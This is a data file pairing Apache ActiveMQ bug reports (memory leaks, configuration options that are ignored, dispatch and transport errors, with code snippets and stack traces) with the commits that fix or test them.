12482239,AMQ-1805,"In our environment, we have several ActvieMQ CPP clients sending persistent messages continuously to a ActiveMQ 5.1 broker. In normal condition the broker works fine until it ran out of disk space. At that point the client would receive out of disk space advisory message AFTER sending the message, therefore the message should be removed from broker, however, the message are kept in the memory due to a problem in the DataFileAppender & AsyncDatamanager, when the disk is full, the message is saved in the inflightWrites map but never taken out since the enqueue will fail due to IOException.

        synchronized (this) {
            // Find the position where this item will land at.
            DataFile dataFile = dataManager.allocateLocation(location);
            if( !sync ) {
                inflightWrites.put(new WriteKey(location), write);
            }
            batch = enqueue(dataFile, write);
        }

and

        synchronized (this) {
            // Find the position where this item will land at.
            DataFile dataFile = dataManager.allocateLocation(location);
            inflightWrites.put(new WriteKey(location), write);
            batch = enqueue(dataFile, write);
        }",1acfd0d6074f037b6ecf85fe2840ca58902c503b,"Fix for https://issues.apache.org/activemq/browse/AMQ-1805

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@669519 13f79535-47bb-0310-9956-ffa450edef68"
12482476,AMQ-1774,<NA>,aee5d25e415a3b1a2615551fa4ad254b00b634fd,"Fix for https://issues.apache.org/activemq/browse/AMQ-1774

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@663644 13f79535-47bb-0310-9956-ffa450edef68"
12482466,AMQ-1770,"You have to set the ""copyMessageOnSend"" option to false in order to get the upload to work for an ActiveMQBlobMessage.

From a user forum thread

""When the message is created with activeMQSession.createBlobMessage(File), it sets the message's blobUploader field. When the ActiveMQBlobMessage.copy() method is called, it does not copy this field. The new message has a null blobUploader. Then, when the ActiveMQBlobMessage.onSend() gets called, it does not upload the file if the blobUploader field is null.""

I am assuming this to be a bug and not by design. ",3103fa99697900457cd186c0d0f73ccc55f62047,"Applied patch for https://issues.apache.org/activemq/browse/AMQ-1770

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@663639 13f79535-47bb-0310-9956-ffa450edef68"
12481882,AMQ-1747,"Trying to write to predefined destinations without admin privileges raises ""cannot create destination"" exception. More info could be foundin the folllowinf thread - http://www.nabble.com/Secutiry-and-Predefined-Destinations-tt17370190s2354.html",041b1b8ad5c8d40c375000e0f3d67b6220269127,"Apply patch for https://issues.apache.org/activemq/browse/AMQ-1747

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@660517 13f79535-47bb-0310-9956-ffa450edef68"
12482137,AMQ-1738,"We have a small timing windows when we closed out the consumer were we take messages it had 'locked' (so that other consumer don't get the same message) and unlock them so that they are available for dispatch. During that window after we unlock those messages, we might still be concurrently sending messages to that subscription. The messages that get sent to the sub after we unlock are the messages that get stuck.
",ff46232797ee38d248c64e69a5122d3ae68e3703,"Fix for: https://issues.apache.org/activemq/browse/AMQ-1738
Messages stuck in a queue don't get dispatch (happens when consumers close out)


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@658370 13f79535-47bb-0310-9956-ffa450edef68"
12482457,AMQ-1717,"We have a use case where we do not want to wait for ActiveMQ if allocated disk space is used up.   So, we set sendFailIfNoSpace to true in the SystemUsage object.

Expected: Setting sendFailIfNoSpace should cause an immediate exception when attempting to send a message if StoreUsage is at or above the max allowed.

Actual: ActiveMQ blocks until disk space is available.

Some analysis of the code shows that org.apache.activemq.broker.region.Queue's send method only throws an exception if MemoryUsage is full:

{code}
        if (isProducerFlowControl() && context.isProducerFlowControl() && memoryUsage.isFull()) {
            if (systemUsage.isSendFailIfNoSpace()) {
                throw new javax.jms.ResourceAllocationException(""SystemUsage memory limit reached"");
            }
}
{code}

We worked around the problem with our embedded broker set-up by explicitly calling StoreUsage.isFull() before sending messages.",90c8ded77131dd848eac5290e966962fbe5c30ed,"Fix for https://issues.apache.org/activemq/browse/AMQ-1717

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@658127 13f79535-47bb-0310-9956-ffa450edef68"
12481800,AMQ-1699,Patch attached.,290f51a1eb3ad92b8d3413f07a7f27856d05980a,"Fix for https://issues.apache.org/activemq/browse/AMQ-1699

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@652440 13f79535-47bb-0310-9956-ffa450edef68"
12482687,AMQ-1687,"Tried upgrading to 5.1 today.  Seems virtual topics are broken with more than one different consumer name/queue.  This is a show-stopper for us as we're using this feature fairly heavily in 4.1 (with some issues, but none like this).

ERROR Service                        - Async error occurred: java.lang.ClassCastException: org.apache.activemq.broker.region.Topic cannot be cast to org.apache.activemq.broker.region.Queue
java.lang.ClassCastException: org.apache.activemq.broker.region.Topic cannot be cast to org.apache.activemq.broker.region.Queue
        at org.apache.activemq.broker.region.QueueSubscription.acknowledge(QueueSubscription.java:50)
        at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:224)
        at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:359)
        at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:470)
        at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)
        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:73)
        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:73)
        at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:84)
        at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:443)
        at org.apache.activemq.command.MessageAck.visit(MessageAck.java:196)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:196)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:183)
        at java.lang.Thread.run(Thread.java:619)

This can be reproduced by modifying the existing VirtualTopicPubSubTest as attached (have two different consumer names).  I could not get it to error with an internal broker.  The easiest way to reproduce is to start an external broker and then run the attached test.  It seems to be important that the broker start clean.

",6c86745810097ce151caf181bcc33b96ce23d064,"Test case for https://issues.apache.org/activemq/browse/AMQ-1687

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@812873 13f79535-47bb-0310-9956-ffa450edef68"
12482213,AMQ-1666,"when connecting over the VM transport, specifying vm://localhost?async=false results in the 'async' flag being sent to false on one side of the transport only.

the supplied patch ensures that all options are applied to the peer as well.",18aa1596a23204ee633ace18b63e8d2323c389b1,"Apply patch for https://issues.apache.org/activemq/browse/AMQ-1666

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@649191 13f79535-47bb-0310-9956-ffa450edef68"
12482699,AMQ-1629,"Version: 5.0 

We have a simple setup to test excludedDestinations config ...We are using the broker and  example producer & consumer from the binary distribution (broker instances A & B are on different hosts 

Setup: 

producer --- A ---- B--- consumer 

Broker A's activemq.xml has the following for NC config (everythingelse is the same as in the orig config file):

    <networkConnectors> 
      <networkConnector name=""toB"" uri=""static://(tcp://B.foo.com:61616)""> 
           <excludedDestinations> 
                <queue physicalName=""TEST.>"" /> 
           </excludedDestinations> 
     </networkConnector> 
    </networkConnectors> 

Issue: consumer attached to Broker B sees all the messages sent to TEST.FOO (the default messages generated by the producer)

We noticed that none of the queue or topic wildcards work, only specific topic or queue names work in the exclusion. However, http://activemq.apache.org/networks-of-brokers.html states ""N.B. You can use wildcards in inclusive , exclusive destination properties"". Are we missing anything ? 

Thanks 
- Sridhar

",4ba485340298e4641b5353fe835046635d77e732,"Applied patch for https://issues.apache.org/activemq/browse/AMQ-1629

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@646268 13f79535-47bb-0310-9956-ffa450edef68"
12482282,AMQ-1542,"This issue has been described in the following mainly pertaining to networkTTL parameter but this bug actually affects all parameters one wishes to propagate to the remote broker via a duplex connection.

see: http://www.nabble.com/NetworkTTL-and-Duplex-Problem-to14428941s2354.html",3163d48eb16ac141bd88acda17a582f7167750c6,"applied patch for https://issues.apache.org/activemq/browse/AMQ-1542

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@610432 13f79535-47bb-0310-9956-ffa450edef68"
12482282,AMQ-1542,"This issue has been described in the following mainly pertaining to networkTTL parameter but this bug actually affects all parameters one wishes to propagate to the remote broker via a duplex connection.

see: http://www.nabble.com/NetworkTTL-and-Duplex-Problem-to14428941s2354.html",049ce286c74a8049e35e6c8393eeaba28c5db7e7,"Fix for http://issues.apache.org/activemq/browse/AMQ-1542


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@656679 13f79535-47bb-0310-9956-ffa450edef68"
12482217,AMQ-1528,<NA>,9f94b6c509e082914537dd2897588f4c5240e474,"Fix for https://issues.apache.org/activemq/browse/AMQ-1528

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@606022 13f79535-47bb-0310-9956-ffa450edef68"
12482730,AMQ-1489,"This bug relates to the MulticastDiscoveryAgent and was discovered when 

1. the discoveryUri of a transportConnector is a multicast-uri such as

{code:xml}
<transportConnector uri=""..."" discoveryUri=""multicast://239.3.7.0:37000"" />
{code}

or

2. the uri of a networkConnector is a multicast-uri such as

{code:xml}
<networkConnector name=""..."" uri=""multicast://239.3.7.0:37000"">
{code}

In these cases, the uri is partially ignored by the MulticastDiscoveryAgent: the host-name of the uri (239.3.7.0) is extracted and used as the group name by the MulticastDiscoveryAgent. But the actual multicast group IP is always 239.255.2.3 and the multicast port is always 6155, regardless of what the actual uri is in the configuration.

The reason for this is that MulticastDiscoveryAgentFactory creates a new MulticastDiscoveryAgent and sets the group based on the uri's host, but fails to set the discoveryURI itself. MulticastDiscoveryAgentFactory should be corrected to do this:

{code:java}
MulticastDiscoveryAgent rc = new MulticastDiscoveryAgent();
rc.setDiscoveryURI(uri); // missing
rc.setGroup(uri.getHost());
{code}

Without the above setting of the discoveryURI the MulticastDiscoveryAgent always uses the DEFAULT_DISCOVERY_URI_STRING which is ""multicast://239.255.2.3:6155"", explaining the erroneous behaviour described above.

  kind regards,
  gerald

http://www.gerald-loeffler.net
",507ef42e593397c5295a46fa99ca6b9d0a4e3806,"AMQ-1489 add comment on possible workaround

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@646930 13f79535-47bb-0310-9956-ffa450edef68"
12482150,AMQ-1479,"The AMQ Store allocates entries in the data logs for commands (including messages/acknowledgements/transaction boundaries etc) - but relies on the reference store for keeping track of data files that are being used. Updates to the reference store happen at a checkpoint() - asynchronously. The problem is that for a fast producer, the current data file (one being written to) can move on past the last known data file to the reference store. As the cleanup() task is a scheduled task - and not coupled to check points - the cleanup task can remove data files that the reference store is not yet aware of AND have are previous to the current data file being written too. 

This issue can result in errors from the AMQ Store such as:

Message: java.io.IOException: Failed to read to journal for: offset = 
2374, file = 1, size = -1, type = 0. Reason: java.io.IOException: Could 
not locate data file data--1 

see: http://www.nabble.com/Please-help-check-ActiveMQ-5.0.0-RC2-tf4692126s2354.html

Test case: org.apache.activemq.bugs.DurableConsumerTest
",9352c9fcdc79367e50ee3931115b5fa72f6d82b0,"Test case for: https://issues.apache.org/activemq/browse/AMQ-1479

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@589048 13f79535-47bb-0310-9956-ffa450edef68"
12482555,AMQ-1473,"Periodically my JMS Client crashes and then can't start back up. I get the following exception:

javax.jms.JMSException: Wire format negociation timeout: peer did not send his wire format.
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:58)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1185)
	at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1263)
	at org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:449)",c0ba767a8855d18302eccf6990b43426436e145c,"https://issues.apache.org/activemq/browse/AMQ-1473 - adding example for log4j jms appender

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@803078 13f79535-47bb-0310-9956-ffa450edef68"
12482136,AMQ-1456,"JMS to JMS Bridge don't work with attribute consumerName in inboundTopicBridge  element.

see http://activemq.apache.org/jms-to-jms-bridge.html#JMStoJMSBridge-TopicBridges
{quote}
 consumerName if set will create a durable consumer
{quote}

My configuration :
{code:xml}
		<jmsBridgeConnectors>
			<jmsTopicConnector name=""testBridge"" jndiOutboundTemplate=""#remoteJndi""
				outboundTopicConnectionFactoryName=""jms.TopicConnectionFactory"" localTopicConnectionFactory=""#localFactory"">
				<outboundTopicBridges>
					<outboundTopicBridge outboundTopicName=""jms.ReplyMessageTopic"" localTopicName=""Test.bridge"" />
				</outboundTopicBridges>
				<inboundTopicBridges>
					<inboundTopicBridge inboundTopicName=""jms.ReplyMessageTopic"" localTopicName=""Test.bridge"" consumerName=""testBridge""/>
				</inboundTopicBridges>
			</jmsTopicConnector>
		</jmsBridgeConnectors>
{code}

When I execute attached test (in patch file), I haved this stacktrace :
{noformat}
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'localbroker' defined in class path resource [org/apache/activemq/network/jms/topic-config.xml]: 
Invocation of init method failed; nested exception is javax.jms.JMSException: You cannot create a durable subscriber without specifying a unique clientID on a Connection
Caused by: javax.jms.JMSException: You cannot create a durable subscriber without specifying a unique clientID on a Connection
	at org.apache.activemq.ActiveMQConnection.checkClientIDWasManuallySpecified(ActiveMQConnection.java:1138)
	at org.apache.activemq.ActiveMQSession.createDurableSubscriber(ActiveMQSession.java:1066)
	at org.apache.activemq.ActiveMQSession.createDurableSubscriber(ActiveMQSession.java:1013)
	at org.apache.activemq.ActiveMQTopicSession.createDurableSubscriber(ActiveMQTopicSession.java:144)
	at org.apache.activemq.network.jms.TopicBridge.createConsumer(TopicBridge.java:68)
	at org.apache.activemq.network.jms.DestinationBridge.start(DestinationBridge.java:103)
	at org.apache.activemq.network.jms.JmsConnector.start(JmsConnector.java:118)
	at org.apache.activemq.broker.BrokerService.startAllConnectors(BrokerService.java:1494)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:402)
{noformat}",4acbd5900af4850b6b0f30e79f5f6bac29fa3dea,"Fix for https://issues.apache.org/activemq/browse/AMQ-1456

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@646395 13f79535-47bb-0310-9956-ffa450edef68"
12482388,AMQ-1446,"I have an application which ran with persistence off, but with transactions.  I noticed just before stopping the broker, I see the following messages:

WARN  org.apache.activemq.store.memory.MemoryPersistenceAdapter - Expected an instance of MemoryMessageStore but was: org.apache.activemq.store.memory.MemoryTransactionStore$2@a0f3d1
WARN  org.apache.activemq.store.memory.MemoryPersistenceAdapter - Expected an instance of MemoryMessageStore but was: org.apache.activemq.store.memory.MemoryTransactionStore$1@e7332d
WARN  org.apache.activemq.store.memory.MemoryPersistenceAdapter - Expected an instance of MemoryMessageStore but was: org.apache.activemq.store.memory.MemoryTransactionStore$1@d10008

It doesn't seem to have affected anything, but I thought it was worth reporting.  I see this in revision 582029.
",1a6cbfa651382286e622c4c9f9c68a4fd55cfffd,"fix for https://issues.apache.org/activemq/browse/AMQ-1446

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@619347 13f79535-47bb-0310-9956-ffa450edef68"
12482377,AMQ-1438," I was facing a problem with the AMQ 4.1 with the LocalAndXATransaction class's isSameRM waiting indefinitely. The wait is because waitForBrokerInfo calls brokerInfoReceived.await()
where brokerInfoReceived is a countdown latch. Once this is waiting it
never gets resumed.

To trigger it the method onCommand(final Object o) has to be called on
org.apache.activemq.ActiveMQConnection. 
",08393aa269f52e346048e611cb74d5602c566768,"Added test case to trunk showing that AMQ-1438 is no longer an issue on the trunk.  



git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@647882 13f79535-47bb-0310-9956-ffa450edef68"
12482326,AMQ-1363,"Try taking a binary build; enabling debug logging by editing activemq/conf/log4j.properties, then rerunning the broker. I get no change!

BTW I've patched the activemq-core-*-tests.jar to not include a log4j.properties file. Also I tried adding the activemq/conf directory explicitly in the console - to no avail.

I also tried zapping the activeio jars and grepping the jars to see if any had any included log4j.properties files - to no avail

",0576de32a79fb7a2c75cda6d0fa21f6d5a61bcf2,"Attempt to fix AMQ-1363, to no avail

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@566177 13f79535-47bb-0310-9956-ffa450edef68"
12482034,AMQ-1343,<NA>,76b2a3ed8ffd70c2dd7ed7fe4cd2007f1244a6e3,"Fix for AMQ-1343 - Network conntions not shutdown propertly when a InvalidClientIDException occurs

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@559139 13f79535-47bb-0310-9956-ffa450edef68"
12481967,AMQ-1255,My ActiveMQ clients create TEMPORARY queues and I have been looking through the active queues recently and I noticed a number of advisory queues are sticking around (mostly ones that have ActiveMQ.Advisory.Producer.*) that refer to the temporary queues that I created. It seems that even though the temporary queues are gone the advisory topics are still there. Over time this looks like it degrades the performance of ActiveMQ.,bff39c565b3f0613427ce235b0533aa7b82669c4,"Test case for https://issues.apache.org/activemq/browse/AMQ-1255

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@647862 13f79535-47bb-0310-9956-ffa450edef68"
12482177,AMQ-1251,"I have around 40 consumers taking messages from a single queue. After awhile 1 or 2 consumers stop receiveing any messages. Going to JMX and stopping corresponding connection causes re-connect and messages are delivered again.

I reproduced it twice in QA enviroment and now it happened in production. I tried to instrument the code and set the log in debug, but that changed timing and I failed to reproduce it after the changes.

I suspect that runtime association b/w Queue and Consumer objects is lost on the Broker side. 

One of the suspects is the empty catch block in the RoundRobinDispatchPolicy (line 64) class. It is possible that the CopyOnWrite array list is messed up and it fails when removed consumer is added back. 

BTW CopyOnWrite list is good when you mostly read, but not so good when you write for every message delivery and empty catch blocks are bad in any case.

if (firstMatchingConsumer != null) {
      // Rotate the consumer list.
      try {
                consumers.remove(firstMatchingConsumer);
                consumers.add(firstMatchingConsumer);
      } catch (Throwable bestEffort) {
      }
}",eba0ae3c7bc13e30ceb8f341ad3916b921cae36a,"test case for https://issues.apache.org/activemq/browse/AMQ-1251

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@571150 13f79535-47bb-0310-9956-ffa450edef68"
12482228,AMQ-1250,"There's another memory leak in the broker, which happens when the broker rejects a new connection attempt (say, when the broker thinks the current clientId already exists).  The problem is in org/apache/activemq/broker/TransportConnection::processAddConnection.  The line of code which calls broker.addConnection might throw an exception (i.e. if the clientId already exists), but the two HashMaps (brokerConnectionStates and localConnectionStates) have already been added to.  So, the exception is thrown and propagated back, but the two maps have not been emptied.

To fix this, I put a try-catch around the broker.addConnection, and if there's an exception, I remove the items from the two maps and then rethrow the exception.  Not sure if this is exactly the proper change - is there some other method that gets called in TransportConnection after the exception is thrown back?  I didn't immediately find anything.

So far, this change has been working for us.",7b1fd3484ef2f557a3b322b5f08a8f5499be2c7f,"Fix for http://issues.apache.org/activemq/browse/AMQ-1250

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@581715 13f79535-47bb-0310-9956-ffa450edef68"
12482117,AMQ-1246,"This error just started occurring after restarting activemq after its memory got fairly high (we've been running our app with this same ActiveMQ 4.2 build for several months without ever seeing this).  It's happening on a persistent topic and doesn't happen after each message is added to the topic but happens every 20 - 30 messages (the occurrence isn't very consistent).

java.lang.IndexOutOfBoundsException: Index: 25, Size: 22
        at java.util.ArrayList.add(ArrayList.java:368)
        at org.apache.activemq.kaha.impl.index.hash.HashPage.addHashEntry(HashPage.java:197)
        at org.apache.activemq.kaha.impl.index.hash.HashPageInfo.addHashEntry(HashPageInfo.java:65)
        at org.apache.activemq.kaha.impl.index.hash.HashBin.addHashEntry(HashBin.java:181)
        at org.apache.activemq.kaha.impl.index.hash.HashBin.put(HashBin.java:144)
        at org.apache.activemq.kaha.impl.index.hash.HashIndex.store(HashIndex.java:230)
        at org.apache.activemq.kaha.impl.container.MapContainerImpl.place(MapContainerImpl.java:389)
        at org.apache.activemq.store.kahadaptor.KahaTopicMessageStore.addMessage(KahaTopicMessageStore.java:62)
        at org.apache.activemq.store.kahadaptor.KahaTransactionStore.addMessage(KahaTransactionStore.java:133)
        at org.apache.activemq.store.kahadaptor.KahaTransactionStore$2.addMessage(KahaTransactionStore.java:68)
        at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:349)
        at org.apache.activemq.broker.region.Topic.send(Topic.java:341)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:306)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:407)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:203)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:127)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:137)
        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:474)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:618)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:282)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:188)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:65)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:133)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:121)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:137)
        at java.lang.Thread.run(Thread.java:595)",229ca6afd760dd57219ce75b1a51216a656da549,"Fix for https://issues.apache.org/activemq/browse/AMQ-1246

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@591160 13f79535-47bb-0310-9956-ffa450edef68"
12482088,AMQ-1218,Simple enough to fix...,98376dd3be560278aaa3af502bac89bc45ff28c2,"AMQ-1218 added version to xbean plugin

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@524280 13f79535-47bb-0310-9956-ffa450edef68"
12481994,AMQ-1165,"The RegionBroker contains the following logic, which overwrites the JMSTimestamp.   FWIU, the message timestamp should be set once at send and never changed by the broker.

        if (message.getTimestamp() > 0 && (message.getBrokerPath() == null || message.getBrokerPath().length == 0)) { 
            //timestamp not been disabled and has not passed through a network
            message.setTimestamp(System.currentTimeMillis());
        }

Attached is a simple test case and patch that changes the '>' in the if statement above to '<='.  I'm not sure if that is the proper fix, but it did make my problem go away.

",274f677ecb8de58404d85a79b8e7c3812fa9572d,"Adding test provided in AMQ-1165


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@512104 13f79535-47bb-0310-9956-ffa450edef68"
12482114,AMQ-1156,"*A. Description*
Setting the wireFormat.tcpNoDelayEnabled flag to true in connection uri's (for example _""tcp://localhost:61616?wireFormat.tcpNoDelayEnabled""_) has no effect:
The sockets created in ActiveMQ do not have the TcpNoDelay flag set to true.
You can verify this for example in the following way: insert the line _System.err.println(sock.getTcpNoDelay());_ at the end of the method
_org.apache.activemq.transport.tcp.TcpTransport.initialiseSocket_.
Also you can try my test at http://www.nabble.com/High-latency-for-small-messages-problem-t3159901.html which makes latency appear if Nagle's algorithm is not disabled.
This affects versions 4.0, 4.1.0, and 4.2.0 latest snapshot. I guess 4.0.2 is affected too.



*B. Reason*
After looking at the source code to understand how the options are set, i saw that in the method org.apache.activemq.transport.tcp.TcpTransportFactory.compositeConfigure the following line appears:
_Map socketOptions = IntrospectionSupport.extractProperties(options, ""socket."")_; 

and also that the method to set the TcpNoDelay option in class _org.apache.activemq.transport.tcp.TcpTransport_ is called _setTcpNoDelay_ and not _setTcpNoDelayEnabled_

Therefore, I tried to write _""socket.tcpNoDelay=true""_ instead of _""wireFormat.tcpNoDelayEnabled=true""_ and it *worked!* This is a *workaround*.

But, _""wireFormat.tcpNoDelayEnabled""_ option is not refused (as _""wireFormat.tcpNoDelayTypoEnabled""_ would be). The option _""tcpNoDelay=true""_ is not refused either, but DOES NOT work either.



*C. Fix*
So, please, for the sake of the poor soul who's next going to try to disable Nagle's algorithm without noticing any effect, and will start looking for the problem elsewhere (and for the sake of consistency also):
-Either change the documentation (http://www.activemq.org/site/tcp-transport-reference.html and http://www.activemq.org/site/configuring-wire-formats.html) to say that one should use the _socket.tcpNoDelay_ option, or
-Change the code to obey the documentation (and make it refuse old options like just _""tcpNoDelay""_ who have no effect).

Personally I would change the documentation ASAP so that people know about the _""socket.tcpNoDelay=true""_ workaround until next version, and then change the code to recognize the _""wireFormat.tcpNoDelayTypoEnabled""_ option. I'd like to point out that the own ActiveMQ test cases use _""wireFormat.tcpNoDelayTypoEnabled""_ .



*D. Related issues*
This is related to a previous post of mine: http://www.nabble.com/High-latency-for-small-messages-problem-t3159901.html
Doing quick synchronized sends showed a 39ms latency if the broker is running in Linux, and a 200ms latency if the broker is in Windows (by the way, if someone knows the bottom reason for this exact latency times, please tell me). Putting the _""wireFormat.tcpNoDelayTypoEnabled""_ to true in order to disable Nagle's algorithm had no effect (because ActiveMQ does not recognize it).

Very probably this is also related to issues https://issues.apache.org/activemq/browse/AMQ-1143 and https://issues.apache.org/activemq/browse/AMQ-1137 (in this one probably Helmutt tried to set the wireFormat.tcpNoDelayTypoEnabled without success because of this).",642d38cd8ca74e4fdc70de0fc4d28f3997d4752c,"Fix for https://issues.apache.org/activemq/browse/AMQ-1156
We now actually update the tcpNoDelay setting on the socket once the wireformat options are negociated.  This allows
the client to control if his socket and the server's socket use the option.  By default tcpNoDelay is enabled.
the client should use a URL like -Durl=tcp://localhost:61616?wireFormat.tcpNoDelayEnabled=false to disable tcpNoDelay on both the client and the server socket.



git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@573080 13f79535-47bb-0310-9956-ffa450edef68"
12482151,AMQ-1152,"Run mvn -Dtest=JmsTest test in the attached sample application.
Redelivery is ignored and failed messages will not stop redelivering.",9b9766d0341441619afbb9622ff96ec127143542,"added test case to try reproduce AMQ-1152 (but unfortunately couldn't)

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@540916 13f79535-47bb-0310-9956-ffa450edef68"
12481886,AMQ-1147,"The cast to the concrete class at ActiveMQManagedConnectionFactory:50 fails:

    public void setResourceAdapter(ResourceAdapter adapter) throws ResourceException {
        this.adapter = (ActiveMQResourceAdapter) adapter;

org.springframework.beans.TypeMismatchException: Failed to convert property value of type [$Proxy63] to required type [javax.resource.spi.ResourceAdapter] for property 'resourceAdapter'; nested exception is java.lang.ClassCastException: $Proxy63 cannot be cast to org.apache.activemq.ra.ActiveMQResourceAdapter
Caused by: java.lang.ClassCastException: $Proxy63 cannot be cast to org.apache.activemq.ra.ActiveMQResourceAdapter
    at org.apache.activemq.ra.ActiveMQManagedConnectionFactory.setResourceAdapter(ActiveMQManagedConnectionFactory.java:50)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:786)
[...]

Spring (2.0.3 build 66) config:

	<aop:aspectj-autoproxy />

	<aop:spring-configured />

	<bean id=""jms.managedConnectionFactory"" class=""org.apache.activemq.ra.ActiveMQManagedConnectionFactory"">
		<property name=""resourceAdapter"">
			<ref local=""jms.resourceAdapter"" />
		</property>
	</bean>

	<bean id=""jms.resourceAdapter"" class=""org.apache.activemq.ra.ActiveMQResourceAdapter"">
		<property name=""serverUrl"">
			<value>${amq.serverUrl}</value>
		</property>
	</bean>

There's probably a workaround for this, but it's still annoying.",3bd948f7388d3e180b187b11a079b277fe56f1ff,"applied modified version of  AMQ-1147 (keeping the implementation classes the same name to avoid issues with existing RA configurations)

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@515576 13f79535-47bb-0310-9956-ffa450edef68"
12481977,AMQ-1140,"When setting compression from the message producer side using the {{ActiveMQConnectionFactory.setUseCompression(true)}} method, a call to the {{ActiveMQConnectionFactory.isUseCompression()}} method then returns true. However, when using [Ethereal|http://www.ethereal.com/] to sniff the packets between brokers, the message bodies are not compressed - they're just plain text. This appears to be a bug. 

I'll try to create a test for this. ",be35271fdc0f73e0fc53f62fbc31bee311b96f04,"Port of rev 501500 fix for https://issues.apache.org/activemq/browse/AMQ-1140


git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@501506 13f79535-47bb-0310-9956-ffa450edef68"
12481022,AMQ-1130,<NA>,6e26195cd86777c2a971896bf912ed75d96e7653,"fix for AMQ-1130 to use LONGBLOB rather than BLOB for persisting on mysql to avoid the 64k limit

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@496976 13f79535-47bb-0310-9956-ffa450edef68"
12482850,AMQ-1112,Ensure messages that are expired are removed from message store and message cursrors are also updated consistently,7da1e6eb8055a220952aedb9bb6d268fedc40d83,"Adding a test for AMQ-1112

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@790199 13f79535-47bb-0310-9956-ffa450edef68"
12482850,AMQ-1112,Ensure messages that are expired are removed from message store and message cursrors are also updated consistently,e5838398105f60bc7521784eacd81dc0762b92fd,"excluding the test for https://issues.apache.org/activemq/browse/AMQ-1112 until it's fixed, so we can have successful builds

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@790526 13f79535-47bb-0310-9956-ffa450edef68"
